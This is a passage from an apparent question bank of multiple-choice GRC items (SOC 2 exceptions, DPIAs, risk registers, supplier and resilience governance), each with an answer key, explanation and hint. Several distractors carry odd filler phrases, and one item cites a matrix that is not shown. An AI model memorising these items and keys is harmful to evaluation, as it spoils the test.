    exhibit: "Control CC6.2: User access is removed on termination within 24 hours.\nTest result: Exception noted in 6 of 40 samples; access removed after 8 to 30 days.\nManagement response: Process updated in Q3; retest scheduled.",
    q: "A vendor's SOC 2 Type 2 report notes an exception: terminated users kept access for up to 30 days. Your data is in scope. What is the BEST action?",
    options: ["Accept the vendor's verbal reassurance that the issue has been fixed for good","End the contract immediately","Ask for remediation evidence, and assess compensating controls","Ignore it as the auditor still gave a clean opinion"],
    correct: 2, why: "Ending the contract is the runner-up as it removes the risk, but it may be disproportionate; assess remediation and compensating controls first.",
    hint: "Assess, do not panic."
  },
  {
    id: 604, rank: 2, role: "grc", topic: "DPIA Outcome Decision", difficulty: "ADVANCED",
    q: "A DPIA concludes that a planned analytics project has high residual risk to individuals that cannot be mitigated. What is the BEST next step?",
    options: ["Consult the supervisory authority before processing begins","Ask the project to wait a month, and proceed, as a general rule","Remove the DPIA from the file","Start anyway, and monitor complaints, then record the result in the ticket"],
    correct: 0, why: "Starting anyway is the runner-up since the business wants the project, but high unmitigated risk requires prior consultation.",
    hint: "Consult first."
  },
  {
    id: 605, rank: 2, role: "grc", topic: "Risk Register Aging", difficulty: "ADVANCED",
    exhibit: "ID   Risk                      Score  Owner     Due         Status\nR-02 Unpatched ERP         High   (none)    2025-06-30  Open\nR-05 Supplier no SOC 2     High   J. Patel  2025-05-31  Open - no update\nR-09 Printer firmware      Low    IT Ops    2026-12-31  Open\nR-12 Phishing exposure     Medium CFO       2026-03-31  Accepted",
    q: "Which finding in this register extract is the biggest governance concern?",
    options: ["Two high risks past due with no owner update","A medium risk accepted by the CFO, in most cases","A new risk with a draft score","A low risk with a review date scheduled for the middle of next year"],
    correct: 0, why: "Overdue high risks without ownership show that the treatment process is failing.",
    hint: "Overdue and unowned."
  },
  {
    id: 606, rank: 2, role: "grc", topic: "Segregation of Duties Matrix", difficulty: "ADVANCED",
    q: "Which role pair in this matrix presents the clearest SoD conflict?",
    options: ["Edit own profile, and view calendar","Raise purchase request, and read policy","Create supplier and approve payment","Run report, and view dashboard"],
    correct: 2, why: "One person controlling both supplier creation and payment approval can commit undetected fraud.",
    hint: "Fraud pair."
  },
  {
    id: 607, rank: 2, role: "grc", topic: "Policy Conflict Resolution", difficulty: "ADVANCED",
    q: "The retention policy requires deleting logs at 90 days, but a regulator requires keeping transaction logs for 7 years. What is the best resolution?",
    options: ["Update the policy with a regulated-log exception","Follow the policy, and ignore the regulation","Ignore the policy, and keep every log forever in case it is ever needed","Ask each team to choose"],
    correct: 0, why: "Legal requirements override internal defaults, so the policy needs a documented exception by data type.",
    hint: "Law prevails, document it."
  },
  {
    id: 608, rank: 2, role: "grc", topic: "Third-Party Concentration Risk", difficulty: "ADVANCED",
    q: "Which finding best shows concentration risk in the supplier portfolio?",
    options: ["One supplier with a long contract","Most critical services run on one cloud provider and region","Many suppliers on small contracts, each of which supports a minor activity","Suppliers in several countries"],
    correct: 1, why: "A single point of failure across critical services creates systemic outage risk.",
    hint: "One dependency."
  },
  {
    id: 609, rank: 2, role: "grc", topic: "Business Impact Calculation", difficulty: "ADVANCED",
    q: "A payment system earns 50,000 per hour. The RTO is 4 hours and an outage actually lasts 9 hours. What revenue is lost beyond the tolerated outage?",
    options: ["100,000, as only half is lost","250,000","450,000, as the whole outage is excess","200,000, as the RTO period counts as revenue earned"],
    correct: 1, why: "9 minus 4 equals 5 hours beyond the RTO, so 5 x 50,000 = 250,000.",
    hint: "Hours beyond RTO."
  },
  {
    id: 610, rank: 2, role: "grc", topic: "Control Maturity Gap", difficulty: "ADVANCED",
    q: "A framework assessment shows target maturity 4 and current maturity 2 for incident response. What should the GRC lead do?",
    options: ["Wait until the next annual review to decide whether the gap matters at all","Change the target to 2","Hide the result","Document the gap, and set a funded plan with milestones, as a first step"],
    correct: 3, why: "A measured gap needs an owned plan; lowering the target hides the issue.",
    hint: "Plan to close."
  },
  {
    id: 611, rank: 2, role: "grc", topic: "Evidence Reliability", difficulty: "ADVANCED",
    q: "Evidence for a patching control is a screenshot of a dashboard supplied by the system owner. What is the BEST improvement?",
    options: ["Use last year's evidence, until the next scheduled review takes place","Accept the screenshot as it was supplied promptly","Obtain a system report with timestamps and the full population","Ask the owner to describe the process in a meeting and note what they say"],
    correct: 2, why: "A screenshot is the runner-up since it is quick, but it cannot show completeness; system reports allow independent sampling.",
    hint: "Complete and independent."
  },
  {
    id: 612, rank: 2, role: "grc", topic: "Cloud Responsibility Matrix", difficulty: "ADVANCED",
    q: "Under shared responsibility for an IaaS virtual machine, who is normally responsible for patching the guest operating system?",
    options: ["The hardware vendor","The customer","The internet service provider","The cloud provider"],
    correct: 1, why: "For IaaS the provider secures the infrastructure and the customer manages the guest OS and above.",
    hint: "Customer manages the OS."
  },
  {
    id: 613, rank: 2, role: "grc", topic: "Privacy Incident Assessment", difficulty: "ADVANCED",
    q: "Marketing emailed 5,000 customers with the wrong attachment containing another customer's name and address. What is the BEST first step?",
    options: ["Tell marketing to send an apology only, and skip any assessment of the data","Wait to see if anyone complains, until the next scheduled review takes place","Contain it, record it and assess the risk to individuals","Treat it as a minor mistake with no record, then record the result in the ticket"],
    correct: 2, why: "Treating it as minor is the runner-up since the data is small, but every personal data breach must be recorded and assessed.",
    hint: "Record and assess."
  },
  {
    id: 614, rank: 2, role: "grc", topic: "Audit Finding Rating", difficulty: "ADVANCED",
    q: "A key control is missing, no compensating control exists and sensitive data is exposed. How should the finding be rated?",
    options: ["Informational","Low","High","Not reportable"],
    correct: 2, why: "Missing key control plus exposure and no compensation yields a high-risk rating.",
    hint: "Impact and no mitigation."
  },
  {
    id: 615, rank: 2, role: "grc", topic: "Regulatory Reporting Clock", difficulty: "ADVANCED",
    q: "An incident is detected on Monday 09:00 and confirmed as a notifiable breach on Tuesday 15:00. When does the 72-hour clock normally start?",
    options: ["From when the organisation became reasonably certain of the breach","From the end of the investigation, once the final report has been signed off","From when the press reports it","From the start of the attack"],
    correct: 0, why: "The period runs from awareness, meaning reasonable certainty that a breach affecting personal data occurred.",
    hint: "Awareness."
  },
  {
    id: 616, rank: 2, role: "grc", topic: "Vendor Offboarding", difficulty: "ADVANCED",
    q: "Which evidence best shows a former supplier no longer holds company data?",
    options: ["The invoice","A signed deletion certificate with scope, date and verification","A contract renewal letter sent by the supplier's sales team at the year end","A promise by email"],
    correct: 1, why: "Deletion evidence closes the data lifecycle.",
    hint: "Certificate and scope."
  },
  {
    id: 617, rank: 2, role: "grc", topic: "Control Design Versus Operation", difficulty: "ADVANCED",
    q: "A policy requires encryption of laptops, but no tool enforces or reports it. Which weakness is this?",
    options: ["A control design gap because nothing ensures it operates","An excellent control","An irrelevant observation","An operating effectiveness pass in which every sample was completed on time"],
    correct: 0, why: "Without enforcement and monitoring, the control cannot be shown to work.",
    hint: "Design gap."
  },
  {
    id: 618, rank: 2, role: "grc", topic: "KPI Misinterpretation", difficulty: "ADVANCED",
    q: "Patching compliance shows 97 percent but the missing 3 percent are all internet-facing servers. What is the BEST view?",
    options: ["Ignore the missing servers as they are a small share of the estate","Remove the metric","Report exposure by criticality, as the unpatched servers carry the most risk, in most cases","Report success as 97 percent exceeds target"],
    correct: 2, why: "Reporting success is the runner-up as the headline meets target, but risk is concentrated where exposure is greatest.",
    hint: "Weight by risk."
  },
  {
    id: 619, rank: 2, role: "grc", topic: "Insurance Questionnaire", difficulty: "ADVANCED",
    q: "The insurer asks if MFA is enforced for all remote access, but it applies only to staff, not contractors. What is the correct answer?",
    options: ["Skip the question","Answer yes","Ask the contractors to say nothing about how they sign in to the network","State the gap accurately, and show the remediation plan, in most cases"],
    correct: 3, why: "Accurate disclosure avoids invalid cover and supports remediation.",
    hint: "Be accurate."
  },
  {
    id: 620, rank: 2, role: "grc", topic: "Exception Review", difficulty: "ADVANCED",
    exhibit: "EXC-118 | Legacy FTP server | Approved: 2025-01-10 | Expiry: 2025-04-10 | Owner: A. Cole | Status: Active | Last review: none",
    q: "An exception granted for 90 days is still active after 14 months. What should GRC do?",
    options: ["Let it continue silently, and revisit the decision after the next release","Extend it automatically","Delete the record, and review the outcome at the next monthly meeting","Escalate to the risk owner for renewal with justification or closure"],
    correct: 3, why: "Expired exceptions must be re-approved or ended.",
    hint: "Expired means re-decide."
  },
  {
    id: 621, rank: 2, role: "grc", topic: "Compliance Mapping Gap", difficulty: "ADVANCED",
    q: "A new customer demands ISO 27001 controls that map to existing SOC 2 controls except for supplier management. What is the best action?",
    options: ["Refuse the customer, and review the outcome at the next monthly meeting","Rename existing controls, and review the outcome at the next monthly meeting","Claim full compliance","Assess the gap and add supplier management controls and evidence"],
    correct: 3, why: "A gap analysis identifies missing controls to implement.",
    hint: "Close the gap."
  },
  {
    id: 622, rank: 2, role: "grc", topic: "Board Risk Report", difficulty: "ADVANCED",
    q: "A quarterly board paper lists 140 risks. What is the BEST improvement?",
    options: ["Publish raw data, and review the outcome at the next monthly meeting","Show top risks against appetite with trends and decisions needed","Add the remaining details as an annex, and review the outcome at the next monthly meeting","Remove all numbers, and revisit the decision after the next release"],
    correct: 1, why: "Adding more detail is the runner-up as it feels thorough, but boards need prioritised decisions.",
    hint: "Top risks and decisions."
  },
  {
    id: 623, rank: 2, role: "grc", topic: "Data Residency Requirement", difficulty: "ADVANCED",
    q: "A contract requires customer data to stay in the EU. Backups replicate to a US region. What is the finding?",
    options: ["Compliant, as backups do not count","Not a finding","Non-compliance with data residency that needs configuration change or a customer agreement, in most cases","A usability issue"],
    correct: 2, why: "Backups contain the data and fall within residency obligations.",
    hint: "Backups count."
  },
  {
    id: 624, rank: 2, role: "grc", topic: "Training Gap Analysis", difficulty: "ADVANCED",
    q: "Phishing reports are rising but click rate by finance staff stays at 14 percent. What is the best targeted action?",
    options: ["Role-specific training and simulation for finance","Do nothing","Repeat the generic annual course for every employee in the whole company","Ban email"],
    correct: 0, why: "Targeted interventions address the highest-risk group.",
    hint: "Target the group."
  },
  {
    id: 625, rank: 2, role: "grc", topic: "Control Redundancy Review", difficulty: "ADVANCED",
    q: "Three overlapping controls detect the same risk, but none covers privileged access. What is the best governance finding?",
    options: ["Accept the gap","Remove all controls","Rebalance controls to cover the uncovered risk and rationalise overlaps","Add a fourth overlapping control, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Effective control design aligns coverage to risk.",
    hint: "Coverage over count."
  },
  {
    id: 626, rank: 2, role: "grc", topic: "Breach Cost Disclosure", difficulty: "ADVANCED",
    q: "How should an organisation treat the cost estimates it gives to executives after a breach?",
    options: ["Present ranges with assumptions and update them as facts emerge","Give a single exact figure at once, and revisit the decision after the next release","Avoid giving any figure","Use the competitor's number, until the next scheduled review takes place"],
    correct: 0, why: "Estimates are uncertain early on, so assumptions must be explicit.",
    hint: "Ranges and assumptions."
  },
  {
    id: 627, rank: 2, role: "grc", topic: "Risk Owner Challenge", difficulty: "ADVANCED",
    q: "A business owner rates a system risk as low because 'we've never been attacked'. What is the BEST response?",
    options: ["Remove the risk","Accept the rating to maintain good relations, and review the outcome at the next monthly meeting","Challenge the rating using threat information and control evidence and document the outcome","Raise the rating without discussion"],
    correct: 2, why: "Accepting it is the runner-up as owners know the business, but absence of past attacks is not evidence of low risk.",
    hint: "Evidence not history."
  },
  {
    id: 628, rank: 2, role: "grc", topic: "Control Evidence Retention", difficulty: "ADVANCED",
    q: "How long should audit evidence be kept?",
    options: ["One week","For the period required by the framework, regulation and contracts, as a general rule","Until a laptop is replaced","Forever"],
    correct: 1, why: "Retention follows legal and assurance requirements.",
    hint: "Follow requirements."
  },
  {
    id: 629, rank: 2, role: "grc", topic: "Material Weakness", difficulty: "ADVANCED",
    q: "Which condition most clearly describes a material weakness in internal control?",
    options: ["A typo in a policy","A late meeting","A missing logo","A deficiency where a material misstatement or loss is reasonably possible, and not prevented or detected"],
    correct: 3, why: "A material weakness is a serious deficiency that could cause significant loss or error to go undetected.",
    hint: "Material impact."
  },
  {
    id: 630, rank: 2, role: "grc", topic: "Contractual Liability", difficulty: "ADVANCED",
    exhibit: "Clause 14.2: Supplier's total liability under this agreement shall not exceed the fees paid in the preceding 12 months (EUR 24,000).",
    q: "A supplier contract caps liability at the annual fee, but a breach could cost far more. What should the customer do?",
    options: ["Negotiate higher liability for data breaches or add insurance requirements","Accept the cap silently, and review the outcome at the next monthly meeting","Ignore the contract","Switch off the supplier, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Contract terms should reflect the risk the customer carries.",
    hint: "Match terms to risk."
  },
  {
    id: 631, rank: 2, role: "grc", topic: "Incident Review Governance", difficulty: "ADVANCED",
    q: "What should a post-incident governance review verify?",
    options: ["That the team worked overtime","That the press release was long","That root causes are fixed and actions have owners and deadlines","That the SIEM is new"],
    correct: 2, why: "Reviews must result in tracked corrective actions.",
    hint: "Closed actions."
  },
  {
    id: 632, rank: 2, role: "grc", topic: "Whistleblower Trend", difficulty: "ADVANCED",
    q: "Reports to the ethics line about security shortcuts increase. What is the right governance response?",
    options: ["Identify the reporters, and revisit the decision after the next release","Investigate themes confidentially and fix systemic causes","Dismiss them","Block the line, until the next scheduled review takes place"],
    correct: 1, why: "Trends indicate cultural or process weaknesses.",
    hint: "Treat as signals."
  },
  {
    id: 633, rank: 2, role: "grc", topic: "Data Classification Audit", difficulty: "ADVANCED",
    q: "An audit finds confidential files stored in a public cloud folder. What is the best remediation?",
    options: ["Rename the folder, and revisit the decision after the next release","Restrict access, review exposure and enforce labelling and DLP","Notify nobody","Delete the audit finding, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Controls must stop exposure and prevent recurrence.",
    hint: "Fix exposure and cause."
  },
  {
    id: 634, rank: 2, role: "grc", topic: "Policy Exception Metrics", difficulty: "ADVANCED",
    q: "Which indicator best shows policy exception management is healthy?",
    options: ["Few exceptions past expiry and all with named owners","Many open exceptions","Exceptions approved verbally","No exceptions ever recorded"],
    correct: 0, why: "Healthy governance keeps exceptions time-bound and owned.",
    hint: "Expiry and owners."
  },
  {
    id: 635, rank: 2, role: "grc", topic: "Control Self-Assessment", difficulty: "ADVANCED",
    q: "What is the main weakness of relying only on control self-assessments?",
    options: ["Owners may rate their own controls too favourably","They require no evidence","They are illegal","They are always accurate"],
    correct: 0, why: "Self-assessment needs challenge and sampling to be reliable.",
    hint: "Bias."
  },
  {
    id: 636, rank: 2, role: "grc", topic: "Resilience Reporting", difficulty: "ADVANCED",
    q: "Which measure best shows operational resilience for a critical service?",
    options: ["Length of the plan","Tested recovery time against the impact tolerance, in most cases","Number of backups","Number of staff"],
    correct: 1, why: "Resilience is shown by tested recovery within tolerance.",
    hint: "Tested recovery."
  },
  {
    id: 637, rank: 2, role: "grc", topic: "Merger Due Diligence", difficulty: "ADVANCED",
    q: "A company acquires a smaller firm with no security programme. What is the BEST first governance step?",
    options: ["Trust their statement","Connect networks immediately","Ignore until year-end","Assess its security posture and data, then plan integration with interim controls, until the next scheduled review takes place"],
    correct: 3, why: "Connecting networks is the runner-up for speed, but it imports unknown risk.",
    hint: "Assess before connecting."
  },
  {
    id: 638, rank: 2, role: "grc", topic: "Records Management", difficulty: "ADVANCED",
    q: "A user deletes records subject to a legal hold. What should the organisation have done?",
    options: ["Deleted backups","Applied the hold technically and told custodians not to delete, as a general rule","Asked the user to restore them later","Nothing"],
    correct: 1, why: "Legal holds need enforced preservation.",
    hint: "Preserve."
  },
  {
    id: 639, rank: 2, role: "grc", topic: "Ethics of Monitoring", difficulty: "ADVANCED",
    q: "The company plans to monitor employee messages for data loss. What governance step is essential?",
    options: ["Monitor everything forever","Share reports widely","Install it secretly","Assess proportionality and privacy impact, inform staff and limit access, as a first step"],
    correct: 3, why: "Monitoring must be lawful, transparent and proportionate.",
    hint: "Proportionate and transparent."
  },
  {
    id: 640, rank: 2, role: "grc", topic: "Subprocessor Change Notice", difficulty: "ADVANCED",
    q: "A processor informs you it will add a new subprocessor in another country. What should the controller do under its data processing agreement?",
    options: ["Ignore the notice","Delete the agreement","Approve without reading","Review the change and object or require safeguards if risks are not acceptable"],
    correct: 3, why: "Controllers keep oversight of subprocessors and transfers.",
    hint: "Review and decide."
  },
  {
    id: 641, rank: 2, role: "grc", topic: "Quantitative Risk Basics", difficulty: "ADVANCED",
    q: "What does annualised loss expectancy combine?",
    options: ["Number of servers, and their location, in most cases","Software licence cost, and age","Staff headcount, and office size, as a general rule","Single loss amount and expected yearly frequency"],
    correct: 3, why: "ALE multiplies the loss from one event by how often it is expected.",
    hint: "Impact times frequency."
  },
  {
    id: 642, rank: 2, role: "grc", topic: "Risk Exception Exhibit", difficulty: "ADVANCED",
    exhibit: "ID   Exception                      Owner   Expires\n11   Legacy TLS on payment API      -       2025-02-01\n12   Shared admin account           IT Ops  2025-12-31\n13   No MFA for contractor VPN      -       2025-05-15\n14   Unpatched printer firmware     Facil.  2026-01-30",
    q: "What is the main weakness in this risk exception register?",
    options: ["It names the business owner, and a valid expiry date for every single entry","Several exceptions have expired with no review or owner","It records the compensating controls that are in place for each exception","It shows that executives approved every entry before the end of the year"],
    correct: 1, why: "Expired unowned exceptions become hidden risk.",
    hint: "Expiry dates."
  },
  {
    id: 643, rank: 2, role: "grc", topic: "Audit Sampling", difficulty: "ADVANCED",
    q: "Why do auditors sample transactions or records?",
    options: ["Sampling guarantees that no errors exist","Testing every item is usually impractical","Samples are chosen by the auditee to be favourable","Auditors avoid reviewing evidence"],
    correct: 1, why: "Sampling allows conclusions with reasonable effort.",
    hint: "Practicality."
  },
  {
    id: 644, rank: 2, role: "grc", topic: "Third-Party Incident Duties", difficulty: "ADVANCED",
    q: "What should a supplier contract say about security incidents?",
    options: ["Notification timelines cooperation and responsibilities","Nothing at all as incidents are always unexpected and cannot be planned for","That the customer pays for every incident that the supplier suffers in the year","That incidents must be kept secret from regulators, and from every other customer"],
    correct: 0, why: "Clear duties speed response and meet legal needs.",
    hint: "Timelines and duties."
  },
  {
    id: 645, rank: 2, role: "grc", topic: "Cross-Border Transfer", difficulty: "ADVANCED",
    q: "What should be in place before transferring personal data to another country?",
    options: ["A change to the file extension of the data, in most cases","Only a verbal promise from the recipient, in most cases","A lawful transfer mechanism and safeguards","Nothing as data moves freely"],
    correct: 2, why: "Transfers must follow legal requirements.",
    hint: "Legal mechanism."
  },
  {
    id: 646, rank: 2, role: "grc", topic: "Control Maturity Exhibit", difficulty: "ADVANCED",
    exhibit: "Domain              Current  Target\nAsset management    3        3\nAccess control      4        3\nIncident response   1        3\nTraining            3        3",
    q: "Which area should this maturity assessment prioritise?",
    options: ["Access control which exceeds its target, in most cases","Training which meets its target, in the first instance","Asset management which meets its target, in most cases","Incident response which is far below its target"],
    correct: 3, why: "The largest gap to target should be addressed first.",
    hint: "Biggest gap."
  },
  {
    id: 647, rank: 2, role: "grc", topic: "Internal Audit Independence", difficulty: "ADVANCED",
    q: "Why must internal audit be independent from the areas it audits?",
    options: ["To avoid communicating with the staff in the areas that it is auditing","To give objective assurance without conflicts of interest","To make the audits quicker by skipping the review of the available evidence","To hide the results from management until the end of the financial year"],
    correct: 1, why: "Independence protects objectivity.",
    hint: "Objective."
  },
  {
    id: 648, rank: 2, role: "grc", topic: "Key Control Selection", difficulty: "ADVANCED",
    q: "How should key controls be identified?",
    options: ["Those that cost the least to operate across all the departments of the company","Those chosen by the control owners alone without any input from the risk team","Those that mitigate the most significant risks","Those that are the easiest to document for the people who write the manual"],
    correct: 2, why: "Focus on controls that matter for risk.",
    hint: "Significant risks."
  },
  {
    id: 649, rank: 2, role: "grc", topic: "Evidence Retention for Audit", difficulty: "ADVANCED",
    q: "Why retain evidence of control operation?",
    options: ["To demonstrate the control worked during the period","To replace the policy documents that the company has written over many years","To increase storage cost, and the budget for the next year is higher","To avoid being asked questions by the auditors during the next annual review cycle"],
    correct: 0, why: "Auditors need records from the review period.",
    hint: "Prove operation."
  },
  {
    id: 650, rank: 2, role: "grc", topic: "Risk Rating Calibration", difficulty: "ADVANCED",
    q: "Why calibrate risk ratings across business units?",
    options: ["So that ratings can be changed without notice","So that low risks disappear from the register","So that every unit reports the same number","So that similar risks are rated consistently"],
    correct: 3, why: "Consistency supports fair prioritisation.",
    hint: "Consistent scale."
  },
  {
    id: 651, rank: 3, role: "grc", topic: "Three Lines Model", difficulty: "EXPERT",
    q: "A company's internal audit team also designs and operates key controls. What is the main governance concern?",
    options: ["Faster control implementation by the audit team","Loss of independence in the third line","Lower audit fees for the business units","More engagement from the board"],
    correct: 1, why: "Internal audit should provide independent assurance and not own the controls it reviews.",
    hint: "Independence."
  },
  {
    id: 652, rank: 3, role: "grc", topic: "FAIR Risk Quantification", difficulty: "EXPERT",
    q: "The board wants cyber risk expressed in financial terms. What is the BEST approach?",
    options: ["Convert every colour on the heat map into a single exact dollar figure","Quantify loss event frequency and magnitude as ranges using a model such as FAIR","Ask each business unit to estimate a figure without any method or data, as a first step","Use the cost of the security budget as the measure of risk exposure, and revisit the decision after the next release"],
    correct: 1, why: "A single exact figure is the runner-up since it is easy to present, but false precision misleads; ranges with stated assumptions are more credible.",
    hint: "Ranges, not point values."
  },
  {
    id: 653, rank: 3, role: "grc", topic: "Continuous Control Monitoring", difficulty: "EXPERT",
    q: "Which design best supports continuous compliance instead of annual evidence gathering?",
    options: ["A yearly spreadsheet filled in by owners the week before the audit, as a general rule","A shared folder where teams upload screenshots when they remember","A request to auditors to accept written statements instead of evidence, as a general rule","Automated evidence from systems mapped to controls with alerts on failure"],
    correct: 3, why: "Automated collection reduces effort, improves accuracy and exposes failures between audits.",
    hint: "Automate evidence."
  },
  {
    id: 654, rank: 3, role: "grc", topic: "Policy Architecture", difficulty: "EXPERT",
    q: "A company has 140 overlapping policies that nobody reads. What is the best redesign?",
    options: ["Add more policies for every new situation that staff raise, as soon as practical","Consolidate into a layered set of policy, standards and procedures with owners","Translate the existing policies into more languages for staff","Remove all policies, and rely on common sense in each team"],
    correct: 1, why: "A concise layered structure with ownership is easier to maintain, understand and audit.",
    hint: "Layer and own."
  },
  {
    id: 655, rank: 3, role: "grc", topic: "Risk Appetite Statement", difficulty: "EXPERT",
    q: "The board approves a high-level appetite statement but managers cannot apply it. What is the BEST improvement?",
    options: ["Replace it with a longer narrative statement about the company values, in most cases","Ask managers to interpret it individually, and record their view, until the next scheduled review takes place","Withdraw the statement until the next strategy cycle begins","Translate it into measurable tolerances and thresholds per risk category"],
    correct: 3, why: "Longer narrative is the runner-up since it adds context, but without measurable thresholds nobody can tell when appetite is exceeded.",
    hint: "Measurable tolerances."
  },
  {
    id: 656, rank: 3, role: "grc", topic: "Assurance Mapping", difficulty: "EXPERT",
    q: "Several teams audit the same controls while other risks have no assurance. What is the best fix?",
    options: ["Add another audit team to cover the controls that the other teams already test","Let each team decide on its own which controls it wants to test each quarter","Build an assurance map across the lines, and plan by risk, wherever possible","Cancel all of the planned audits for a year, and review the position afterwards"],
    correct: 2, why: "Mapping assurance avoids duplication and gaps.",
    hint: "Map assurance."
  },
  {
    id: 657, rank: 3, role: "grc", topic: "AI Governance Framework", difficulty: "EXPERT",
    q: "A company starts using generative AI across departments. Which first governance step is most important?",
    options: ["Define approved uses, data rules, owners and a risk assessment","Buy the most expensive AI platform available, and roll it out to every team","Let each department choose any tool it likes without approval from the centre","Ban all use of AI permanently without any review of the possible benefits"],
    correct: 0, why: "Clear ownership and data rules enable safe adoption while controlling risk.",
    hint: "Rules and owners."
  },
  {
    id: 658, rank: 3, role: "grc", topic: "Privacy Engineering Integration", difficulty: "EXPERT",
    q: "How should privacy requirements reach the product development lifecycle?",
    options: ["As a poster in the office kitchen that explains the principles of privacy","As an annual email sent to all engineers reminding them about data protection","As design requirements and automated checks in delivery pipelines","As a long document handed to the developers at the very end of the project"],
    correct: 2, why: "Embedding requirements in delivery makes privacy repeatable and testable.",
    hint: "Build it in."
  },
  {
    id: 659, rank: 3, role: "grc", topic: "Third-Party Programme Scaling", difficulty: "EXPERT",
    q: "A company has 2,000 suppliers and one analyst. What is the BEST way to scale third-party risk management?",
    options: ["Tier suppliers by risk and automate low-risk assessments while focusing manual effort on critical ones","Assess only suppliers whose names are familiar","Stop assessing suppliers, and rely on contracts only","Assess all suppliers in the same depth over several years, and revisit the decision after the next release"],
    correct: 0, why: "Uniform depth is the runner-up since it is fair, but it spreads effort too thin; risk-tiering focuses scarce effort where harm is highest.",
    hint: "Tier and automate."
  },
  {
    id: 660, rank: 3, role: "grc", topic: "Regulatory Overlap", difficulty: "EXPERT",
    q: "A global company faces overlapping privacy and cyber laws. What is the most efficient compliance design?",
    options: ["A common control baseline with regional addenda for specific requirements","Separate programmes per country with no coordination","Meet only the weakest law","Ignore laws outside headquarters, until the next scheduled review takes place"],
    correct: 0, why: "A unified baseline plus local variations reduces duplication.",
    hint: "Baseline and addenda."
  },
  {
    id: 661, rank: 3, role: "grc", topic: "Exception Governance Design", difficulty: "EXPERT",
    q: "Exceptions are granted informally and never expire. Which design best fixes this?",
    options: ["A rule that no exceptions are ever allowed under any circumstances in the business","A verbal approval process for urgent cases handled by the line manager","A central register with owners, expiry and automatic reminders","A yearly clean-up of the exceptions by the external auditor at the audit visit"],
    correct: 2, why: "Visible, time-bound, owned exceptions keep risk controlled.",
    hint: "Central and expiring."
  },
  {
    id: 662, rank: 3, role: "grc", topic: "Cyber Insurance Strategy", difficulty: "EXPERT",
    q: "How should cyber insurance fit in the risk strategy?",
    options: ["As the only response that the company needs to prepare for ransomware events","As one part of risk transfer once exposure is understood","As a substitute for security investment, as the insurer will pay for any loss","As a way to avoid reporting incidents to regulators, and customers afterwards"],
    correct: 1, why: "Insurance transfers residual financial risk but does not remove obligations or reduce attack likelihood.",
    hint: "Residual risk only."
  },
  {
    id: 663, rank: 3, role: "grc", topic: "ISMS Scope Definition", difficulty: "EXPERT",
    q: "A company defines its ISO 27001 scope to include only one small office to simplify certification. Customers expect the whole service to be covered. What is the BEST response?",
    options: ["Define scope from the services and data customers rely on and justify any exclusions","Expand the scope to include the office kitchen","Remove the exclusions, and avoid recording the reason, and review the outcome at the next monthly meeting","Keep the small scope, and advertise it as company-wide certification, until the next scheduled review takes place"],
    correct: 0, why: "A narrow scope is the runner-up as it eases audits, but misrepresenting coverage misleads customers.",
    hint: "Scope reflects reality."
  },
  {
    id: 664, rank: 3, role: "grc", topic: "KRI Design", difficulty: "EXPERT",
    q: "Which KRI design principle makes indicators most useful?",
    options: ["Each is reported once a year to the board in the annual report to shareholders","Each uses the same threshold value for every team whatever its risk profile","Each is chosen as the data is easy for the team to collect each month","Each has a threshold, an owner and an agreed action"],
    correct: 3, why: "Indicators drive action only when thresholds and responses are defined.",
    hint: "Threshold and action."
  },
  {
    id: 665, rank: 3, role: "grc", topic: "Audit Plan Prioritisation", difficulty: "EXPERT",
    q: "How should an annual internal audit plan be prioritised?",
    options: ["By alphabetical order of the department names in the organisational chart","By the preferences of the audit staff, and the projects they enjoy working on","By repeating last year's order of audits without considering any changes","By risk to objectives, business change and assurance gaps"],
    correct: 3, why: "Risk-based planning directs limited resources to the most significant exposures.",
    hint: "Risk-based."
  },
  {
    id: 666, rank: 3, role: "grc", topic: "Operational Resilience Mapping", difficulty: "EXPERT",
    q: "What should a resilience programme map for each important business service?",
    options: ["Only the name of the owner, and the date on which the service was first launched","People, process, technology, data and suppliers it depends on","Only the annual budget that the owner has been given for the service","Only the servers that it uses, as they are the most expensive item to replace"],
    correct: 1, why: "End-to-end dependencies show where disruption would break the service.",
    hint: "Map dependencies."
  },
  {
    id: 667, rank: 3, role: "grc", topic: "Data Governance Link", difficulty: "EXPERT",
    q: "Why should security governance be linked to data governance?",
    options: ["Security governance replaces privacy, and data protection duties in the organisation","They are unrelated disciplines that report to different executives in most companies","Protection depends on data classification, ownership and lifecycle, as a general rule","Data governance replaces the need for any security controls on the systems involved, as a general rule"],
    correct: 2, why: "Knowing what data exists and who owns it drives proportionate controls.",
    hint: "Data drives controls."
  },
  {
    id: 668, rank: 3, role: "grc", topic: "Control Rationalisation", difficulty: "EXPERT",
    q: "A framework review finds 600 controls, many duplicated across standards. What is the BEST action?",
    options: ["Keep all, and test each separately","Create a unified control library with mappings and retire duplicates","Add a new framework to fix it, and review the outcome at the next monthly meeting","Remove controls randomly"],
    correct: 1, why: "Keeping and testing all separately is the runner-up as nothing is lost, but it wastes effort and hides gaps.",
    hint: "Unify and map."
  },
  {
    id: 669, rank: 3, role: "grc", topic: "Culture Measurement", difficulty: "EXPERT",
    q: "Which approach best measures security culture?",
    options: ["The number of posters displayed around the offices during the awareness month","Behaviour measures such as reporting rates and survey trends, as a general rule","The number of phishing emails that the mail gateway blocked during the past year","The number of policies signed by employees during the annual onboarding session, in most cases"],
    correct: 1, why: "Culture is shown in behaviours and attitudes, not artefacts.",
    hint: "Behaviour."
  },
  {
    id: 670, rank: 3, role: "grc", topic: "Incident Governance Escalation", difficulty: "EXPERT",
    q: "What should the incident governance model define for a severe data breach?",
    options: ["Decision rights, notification duties and who may accept risk","Only the technical tools that the response team uses during the first hour","Only the list of vendors that the company has used to supply security tools","Only the date of the next meeting of the incident response working group"],
    correct: 0, why: "Roles and decision authority speed up critical decisions.",
    hint: "Decision rights."
  },
  {
    id: 671, rank: 3, role: "grc", topic: "Regulator Engagement", difficulty: "EXPERT",
    q: "What is the best approach when a regulator asks questions after an incident?",
    options: ["Reply from each team separately, and every question gets a quick answer","Delay indefinitely until the regulator has stopped asking for any information","Coordinate one factual response through legal and compliance","Provide the regulator with the team's speculation about the possible causes"],
    correct: 2, why: "Consistent accurate responses protect credibility and reduce legal risk.",
    hint: "One accurate voice."
  },
  {
    id: 672, rank: 3, role: "grc", topic: "Supplier Concentration Strategy", difficulty: "EXPERT",
    q: "An outage at one cloud provider would stop all critical services. What is the BEST resilience decision?",
